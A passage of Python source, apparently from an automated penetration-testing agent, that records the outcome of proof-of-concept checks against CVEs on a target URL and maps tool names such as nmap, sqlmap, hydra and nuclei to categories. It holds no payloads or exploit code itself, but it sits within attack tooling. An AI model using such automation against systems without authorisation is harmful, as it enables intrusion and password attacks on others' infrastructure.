            except Exception as e:
                results.append({
                    "type": "poc_verified",
                    "cve": cve,
                    "vulnerability": poc_config.get("vulnerability", vuln_name),
                    "url": url,
                    "success": False,
                    "vuln_confirmed": False,
                    "verification": f"请求失败: {str(e)[:100]}",
                })

        except Exception as e:
            print(f"[ReAct] POC 适配失败 ({cve}): {e}")
            continue

    return results


def _get_category_for_tool(tool: str) -> str:
    """根据工具名返回 HexStrike 类别"""
    category_map = {
        "nmap": "network",
        "sqlmap": "web_security",
        "whatweb": "web_security",
        "nikto": "vuln_scanning",
        "nuclei": "vuln_scanning",
        "ffuf": "web_security",
        "dirb": "web_security",
        "subfinder": "osint",
        "amass": "osint",
        "httpx": "web_security",
        "hydra": "password",
        "masscan": "network",
    }

    for key, category in category_map.items():
        if key in tool.lower():
            return category

    return "network"